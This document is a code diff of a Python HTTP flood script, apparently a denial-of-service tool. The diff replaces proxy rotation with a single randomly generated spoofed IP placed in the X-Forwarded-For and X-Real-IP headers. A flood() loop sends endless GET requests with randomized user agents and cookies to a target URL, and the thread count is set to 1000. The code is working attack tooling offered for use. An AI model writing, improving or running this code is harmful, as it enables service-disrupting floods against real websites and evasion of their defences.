@@ -12,24 +12,14 @@ with open('useragents.txt', 'r') as file:
 with open('referers.txt', 'r') as file:
     referers = [line.strip() for line in file.readlines()]
 
-with open('proxy.txt', 'r') as file:
-    proxies_list = [line.strip() for line in file.readlines()]
-
-def get_random_ip():
-    time.sleep(random.uniform(0.1, 0.5))
-    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-
-def get_proxy():
-    proxy_entry = random.choice(proxies_list)
-    proxy_parts = proxy_entry.split(':')
-    if proxy_parts[0] in ['http', 'https', 'socks4', 'socks5']:
-        proxy_type = proxy_parts[0]
-        proxy_url = f"{proxy_type}://{':'.join(proxy_parts[1:])}"
-        return {"http": proxy_url, "https": proxy_url}
-    return None
+def generate_ip():
+    "Gera um endereço IP aleatório, tentando ser mais 'robusto' ao variar os blocos de IP."
+    blocks = [random.randint(0, 255) for _ in range(4)]
+    return ".".join(str(block) for block in blocks)
 
 def flood():
     while True:
+        spoofed_ip = generate_ip()
         custom_headers = {
             "User-Agent": random.choice(user_agents),
             "Accept-Language": "en-US,en;q=0.5",
@@ -40,9 +30,9 @@ def flood():
             "Accept-Encoding": "gzip, deflate",
             "Pragma": "no-cache",
             "Upgrade-Insecure-Requests": "1",
-            "X-Forwarded-For": get_random_ip(),
+            "X-Forwarded-For": spoofed_ip,
             "X-Forwarded-Proto": "http",
-            "X-Real-IP": get_random_ip(),
+            "X-Real-IP": spoofed_ip,
             "X-Frame-Options": "deny",
             "X-Content-Type-Options": "nosniff",
             "X-XSS-Protection": "1; mode=block",
@@ -51,17 +41,12 @@ def flood():
             "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
             "Cookie": "".join(random.choices(string.ascii_letters + string.digits, k=20))
         }
-        proxy_dict = get_proxy()
-        time.sleep(random.uniform(0.5, 2))
-
-        if proxy_dict is not None:
-            try:
-                response = requests.get(target_url, headers=custom_headers, proxies=proxy_dict)
-                print(f"GET request sent to {target_url} via {list(proxy_dict.values())[0]}. Response status code: {response.status_code}")
-            except requests.exceptions.RequestException as e:
-                print(f"An error occurred: {e}")
-        else:
-            print("Invalid proxy format.")
+        try:
+            response = requests.get(target_url, headers=custom_headers)
+            print(f"GET request sent to {target_url} from spoofed IP {spoofed_ip}. Response status code: {response.status_code}")
+            time.sleep(random.uniform(0.5, 2))  # Uma pequena pausa entre as requisições
+        except requests.exceptions.RequestException as e:
+            print(f"An error occurred: {e}")
 
 num_threads = 1000
 
